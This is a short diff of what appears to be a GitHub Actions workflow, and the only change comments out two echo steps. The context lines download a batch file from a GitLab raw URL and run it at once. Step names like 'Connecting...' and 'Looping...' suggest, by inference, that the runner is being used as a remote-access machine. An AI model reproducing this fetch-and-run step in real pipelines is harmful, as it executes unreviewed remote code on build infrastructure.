@@ -31,13 +31,13 @@ jobs:
           Invoke-WebRequest -Uri "https://gitlab.com/rangagtlab/light-manager/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
           cmd /c Downloads.bat
       - name: Done!
-        run: cmd /c echo Done!
+      # run: cmd /c echo Done!
         
       # Runs a set of commands using the runners shell
       - name: Connecting...
         run: cmd /c show.bat
       - name: Connected!
-        run: cmd /c echo Connected!
+      # run: cmd /c echo Connected!
         
       - name: Looping...
         run: cmd /c loop.bat
